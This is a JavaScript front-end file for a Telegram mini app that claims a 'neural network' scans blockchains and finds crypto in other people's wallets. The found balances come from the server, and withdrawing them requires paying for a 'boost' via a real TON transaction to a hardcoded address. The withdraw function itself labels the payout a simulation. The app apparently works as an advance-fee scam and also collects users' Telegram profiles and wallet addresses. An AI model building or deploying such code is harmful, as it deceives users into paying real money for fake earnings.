// public/app.js
// Real TON Connect + Telegram WebApp + Dynamic Neural Status

const PAGES = {
  scan: document.getElementById('page-scan'),
  boost: document.getElementById('page-boost'),
  profile: document.getElementById('page-profile')
};
const navBtns = document.querySelectorAll('.bottom-nav .nav-btn');

const startScanBtn = document.getElementById('startScan');
const stopScanBtn = document.getElementById('stopScan');
const scanResult = document.getElementById('scanResult');
const balancesList = document.getElementById('balancesList');
const totalUsdValue = document.getElementById('totalUsdValue');

// Cards
const neuralStatusCard = document.getElementById('neuralStatusCard');
const welcomeCard = document.getElementById('welcomeCard');

// Neural status elements
const statusNetwork = document.getElementById('statusNetwork');
const statusWallet = document.getElementById('statusWallet');
const statusAI = document.getElementById('statusAI');
const statusScanned = document.getElementById('statusScanned');
const statusSpeed = document.getElementById('statusSpeed');
const statusOnline = document.getElementById('statusOnline');

// Header elements
const headerSpeed = document.getElementById('headerSpeed');
const headerRate = document.getElementById('headerRate');
const telegramUserDiv = document.getElementById('telegramUser');
const telegramAvatar = document.getElementById('telegramAvatar');
const telegramUsername = document.getElementById('telegramUsername');

// Welcome card
const totalScanned = document.getElementById('totalScanned');
const welcomeTotalUsd = document.getElementById('welcomeTotalUsd');

// Boost elements
const buyBtns = document.querySelectorAll('.buy-btn');
const boostPanelInfo = document.getElementById('boostPanelInfo');

// Profile elements
const profileTotalUsd = document.getElementById('profileTotalUsd');
const profileBalancesList = document.getElementById('profileBalancesList');
const boostStatusText = document.getElementById('boostStatusText');
const nonZeroCount = document.getElementById('nonZeroCount');

let tonConnectUI = null;
let walletAddress = null;
let scanning = false;
let baseScanDelay = 2000; // 2 seconds
let currentProfile = null;

// TON Connect initialization
function initTonConnect() {
  try {
    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: 'https://raw.githubusercontent.com/ton-community/tutorials/main/03-client/test/public/tonconnect-manifest.json',
      buttonRootId: 'tonConnectBtn'
    });

    tonConnectUI.onStatusChange(wallet => {
      if (wallet) {
        walletAddress = wallet.account.address;
        showBoostMessage(`✅ Wallet connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`, 'success');
        fetch('/api/store-ton', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address: walletAddress })
        }).catch(console.error);
        refreshProfile();
      } else {
        walletAddress = null;
        showBoostMessage('Connect your TON wallet to purchase boosts', 'info');
      }
    });
  } catch (e) {
    console.error('TON Connect init failed:', e);
  }
}

// Navigation
navBtns.forEach(b => b.addEventListener('click', () => {
  const p = b.dataset.page;
  Object.values(PAGES).forEach(x => x.classList.remove('active'));
  PAGES[p].classList.add('active');
  navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === p));
  if (p === 'profile') refreshProfile();
}));

// Helpers
const SUPPORTED = ['TON', 'BTC', 'ETH', 'SOL', 'TRX', 'BNB', 'LTC', 'USDT', 'USDC'];

function fmtAmount(v, p = 8) {
  const n = Number(v || 0);
  if (Math.abs(n) >= 1) return n.toLocaleString(undefined, { maximumFractionDigits: p });
  return n.toFixed(Math.min(p, 8)).replace(/\.?0+$/, '');
}

function fmtUSD(v) {
  if (v == null || isNaN(v)) return '0.00';
  return Number(v).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function showBoostMessage(msg, type = 'info') {
  boostPanelInfo.innerText = msg;
  boostPanelInfo.style.display = 'block';
  
  const colors = {
    success: { bg: 'rgba(16, 185, 129, 0.15)', border: 'rgba(16, 185, 129, 0.4)', color: '#10b981' },
    error: { bg: 'rgba(239, 68, 68, 0.15)', border: 'rgba(239, 68, 68, 0.4)', color: '#ef4444' },
    info: { bg: 'rgba(6, 182, 212, 0.15)', border: 'rgba(6, 182, 212, 0.4)', color: '#06b6d4' }
  };
  
  const style = colors[type] || colors.info;
  boostPanelInfo.style.background = style.bg;
  boostPanelInfo.style.borderColor = style.border;
  boostPanelInfo.style.color = style.color;
}

// Update neural status
function updateNeuralStatus(profile) {
  if (!profile) return;
  
  statusNetwork.innerText = profile.wallet?.network || 'Binance Smart Chain';
  statusWallet.innerText = profile.wallet?.address || '0x0000...0000';
  statusScanned.innerText = profile.scannedWallets || 0;
  statusSpeed.innerText = `${profile.speedMultiplier || 1}x`;
  statusOnline.innerText = profile.statusOnline ? '●' : '○';
  
  // Update header
  headerSpeed.innerText = `${profile.speedMultiplier || 1}x`;
  headerRate.innerText = `${(profile.findRate * 100).toFixed(0)}%`;
  
  // AI Status when scanning
  if (scanning) {
    statusAI.innerText = 'Neural network scanning blockchain for crypto wallets...';
  }
}

// Update Telegram user display
function updateTelegramUser(profile) {
  if (profile && profile.telegramUser) {
    const user = profile.telegramUser;
    telegramUsername.innerText = user.username ? `@${user.username}` : user.first_name || 'User';
    
    // Try to get photo
    if (user.photo_url) {
      telegramAvatar.src = user.photo_url;
    } else {
      // Use unavatar.io as fallback if username exists
      if (user.username) {
        telegramAvatar.src = `https://unavatar.io/telegram/${user.username}`;
      } else {
        // Default avatar
        telegramAvatar.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(user.first_name || 'User')}&background=8b5cf6&color=fff`;
      }
    }
    
    telegramUserDiv.classList.remove('hidden');
  }
}

// Fetch profile
async function fetchProfile() {
  const res = await fetch('/api/profile');
  if (!res.ok) throw new Error('Profile fetch failed');
  return await res.json();
}

// Refresh profile and update all displays
async function refreshProfile() {
  try {
    const p = await fetchProfile();
    currentProfile = p;
    
    updateNeuralStatus(p);
    updateTelegramUser(p);
    
    // Update welcome card stats
    if (totalScanned) totalScanned.innerText = p.scannedWallets || 0;
    if (welcomeTotalUsd) welcomeTotalUsd.innerText = fmtUSD(p.totalUsd);
    
    // Update scan page balances
    balancesList.innerHTML = '';
    const keys = Object.keys(p.balances || {});
    
    for (const k of keys) {
      const li = document.createElement('li');
      const balance = p.balances[k];
      const usdInfo = p.usdBalances && p.usdBalances[k];
      const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
      
      li.innerHTML = `
        <div class="label">${k}</div>
        <div class="amount">
          <div>${fmtAmount(balance)}</div>
          <div class="usd">$${usdText}</div>
        </div>
      `;
      balancesList.appendChild(li);
    }
    
    // Update total USD
    if (totalUsdValue) {
      totalUsdValue.innerText = fmtUSD(p.totalUsd);
    }
    
    // Update profile page
    if (profileTotalUsd) {
      profileTotalUsd.innerText = fmtUSD(p.totalUsd);
    }
    
    // Update boost status
    if (boostStatusText) {
      if (p.boost && p.boost.purchased) {
        boostStatusText.innerText = `${p.boost.amount} TON Boost Active (${p.speedMultiplier}x Speed)`;
      } else {
        boostStatusText.innerText = 'No Active Boost';
      }
    }
    
    // Update profile balances with withdraw buttons
    if (profileBalancesList) {
      profileBalancesList.innerHTML = '';
      let nonZero = 0;
      
      for (const k of keys) {
        const balance = p.balances[k];
        if (balance <= 0) continue;
        
        nonZero++;
        const usdInfo = p.usdBalances && p.usdBalances[k];
        const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
        
        const item = document.createElement('div');
        item.className = 'profile-balance-item';
        item.innerHTML = `
          <div class="balance-info">
            <div class="balance-crypto">${k}</div>
            <div class="balance-amount">${fmtAmount(balance)} ≈ $${usdText}</div>
          </div>
          <div class="balance-actions">
            <button class="btn-withdraw" data-crypto="${k}" ${!p.boost || !p.boost.purchased ? 'disabled' : ''}>
              Withdraw
            </button>
          </div>
        `;
        profileBalancesList.appendChild(item);
      }
      
      if (nonZeroCount) {
        nonZeroCount.innerText = nonZero;
      }
      
      // Add withdraw handlers
      document.querySelectorAll('.btn-withdraw').forEach(btn => {
        btn.addEventListener('click', (e) => handleWithdraw(e.target.dataset.crypto));
      });
    }
  } catch (e) {
    console.error('Profile refresh error:', e);
  }
}

// Purchase boost with real TON transaction
async function buyBoostWithTon(amount) {
  if (!walletAddress) {
    showBoostMessage('⚠️ Please connect your TON wallet first', 'error');
    return;
  }
  
  const amountInNano = amount * 1000000000; // Convert TON to nanoTON
  const TON_RECEIVE_ADDRESS = currentProfile?.tonReceiveAddress || 'UQAhk2ixejZ9_K0MPQjH3CUN4_PSDUfZEGaXtKU78nh-0Fdn';
  
  try {
    showBoostMessage('📤 Preparing transaction...', 'info');
    
    // Send real TON transaction
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes
      messages: [
        {
          address: TON_RECEIVE_ADDRESS,
          amount: amountInNano.toString(),
          payload: '' // Optional comment
        }
      ]
    };
    
    const result = await tonConnectUI.sendTransaction(transaction);
    
    showBoostMessage('⏳ Transaction sent! Confirming...', 'info');
    
    // Confirm boost on backend
    const res = await fetch('/api/confirm-boost', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        amount, 
        txHash: result.boc
      })
    });
    
    const r = await res.json();
    if (r.success) {
      showBoostMessage(
        `✅ Boost activated! Speed: ${r.speedMultiplier}x | Find Rate: ${(r.findRate * 100).toFixed(0)}%`, 
        'success'
      );
      await refreshProfile();
    } else {
      showBoostMessage('❌ ' + (r.error || 'Boost activation failed'), 'error');
    }
  } catch (e) {
    console.error('Transaction error:', e);
    if (e.message && e.message.includes('user reject')) {
      showBoostMessage('❌ Transaction cancelled by user', 'error');
    } else {
      showBoostMessage('❌ Transaction failed: ' + (e.message || 'Unknown error'), 'error');
    }
  }
}

buyBtns.forEach(b => b.addEventListener('click', (ev) => {
  buyBoostWithTon(Number(ev.currentTarget.dataset.amt));
}));

// Scan single wallet
async function scanSingleWallet() {
  try {
    const res = await fetch('/api/scan-wallet', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({})
    });
    const j = await res.json();
    
    if (j.result && j.result.found) {
      const { crypto, amount } = j.result;
      const usdInfo = j.usdBalances && j.usdBalances[crypto];
      const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
      
      // Show found notification
      scanResult.innerHTML = `
        <span class="result-icon">🎉</span>
        <span>Found ${fmtAmount(amount)} ${crypto} ($${usdText})!</span>
      `;
      scanResult.style.background = 'rgba(16, 185, 129, 0.15)';
      scanResult.style.borderColor = 'rgba(16, 185, 129, 0.4)';
      scanResult.style.color = '#10b981';
    } else {
      scanResult.innerHTML = `
        <span class="result-icon">🔍</span>
        <span>Scanning... Wallet #${j.scannedWallets || 0}</span>
      `;
      scanResult.style.background = 'rgba(6, 182, 212, 0.08)';
      scanResult.style.borderColor = 'rgba(6, 182, 212, 0.2)';
      scanResult.style.color = '#06b6d4';
    }
    
    await refreshProfile();
  } catch (e) {
    console.error('Scan error:', e);
  }
}

// Continuous scan loop (1 wallet at a time)
async function startContinuousScan() {
  if (scanning) return;
  scanning = true;
  
  // Show NEURAL.SCAN.STATUS, hide Welcome Card
  neuralStatusCard.style.display = 'block';
  welcomeCard.style.display = 'none';
  
  startScanBtn.classList.add('hidden');
  stopScanBtn.classList.remove('hidden');
  
  scanResult.innerHTML = `
    <span class="result-icon">⚡</span>
    <span>Neural network activated...</span>
  `;
  scanResult.style.background = 'rgba(139, 92, 246, 0.15)';
  scanResult.style.borderColor = 'rgba(139, 92, 246, 0.4)';
  scanResult.style.color = '#8b5cf6';
  
  if (statusAI) {
    statusAI.innerText = 'Neural network scanning blockchain for crypto wallets...';
  }
  
  while (scanning) {
    try {
      const p = await fetchProfile();
      currentProfile = p;
      updateNeuralStatus(p);
      
      const mult = p.speedMultiplier || 1;
      const effectiveDelay = Math.max(200, Math.round(baseScanDelay / mult));
      
      await scanSingleWallet();
      await new Promise(r => setTimeout(r, effectiveDelay));
    } catch (e) {
      console.error('Scan loop error:', e);
      await new Promise(r => setTimeout(r, baseScanDelay));
    }
  }
  
  scanResult.innerHTML = `
    <span class="result-icon">⏸</span>
    <span>Scan paused. Click Start to resume.</span>
  `;
  scanResult.style.background = 'rgba(245, 158, 11, 0.15)';
  scanResult.style.borderColor = 'rgba(245, 158, 11, 0.4)';
  scanResult.style.color = '#f59e0b';
  
  startScanBtn.classList.remove('hidden');
  stopScanBtn.classList.add('hidden');
  
  // Hide NEURAL.SCAN.STATUS, show Welcome Card
  neuralStatusCard.style.display = 'none';
  welcomeCard.style.display = 'block';
  
  await refreshProfile();
}

// Start/stop handlers
startScanBtn.addEventListener('click', () => startContinuousScan());
stopScanBtn.addEventListener('click', () => { scanning = false; });

// Withdraw handler
async function handleWithdraw(crypto) {
  if (!currentProfile || !currentProfile.boost || !currentProfile.boost.purchased) {
    alert('⚠️ Withdrawals require an active boost package!');
    return;
  }
  
  const balance = currentProfile.balances[crypto];
  if (!balance || balance <= 0) {
    alert('⚠️ Insufficient balance!');
    return;
  }
  
  const amount = prompt(`Enter amount of ${crypto} to withdraw (Max: ${fmtAmount(balance)}):`);
  if (!amount) return;
  
  const amt = Number(amount);
  if (isNaN(amt) || amt <= 0 || amt > balance) {
    alert('⚠️ Invalid amount!');
    return;
  }
  
  try {
    const res = await fetch('/api/withdraw', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ crypto, amount: amt })
    });
    
    const r = await res.json();
    if (r.success) {
      alert(`✅ ${r.message}\n\nNote: This is a simulation. In production, funds would be sent to your wallet.`);
      await refreshProfile();
    } else {
      alert('❌ ' + (r.error || 'Withdrawal failed'));
    }
  } catch (e) {
    console.error('Withdraw error:', e);
    alert('❌ Network error');
  }
}

// Initialize Telegram WebApp
if (window.Telegram && window.Telegram.WebApp) {
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();
  
  // Get user data from Telegram
  const user = tg.initDataUnsafe.user;
  if (user) {
    // Store Telegram user data
    fetch('/api/store-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ telegramUser: user })
    }).then(() => {
      refreshProfile();
    }).catch(console.error);
  }
}

// Initial setup
async function init() {
  await refreshProfile();
  initTonConnect();
}

init();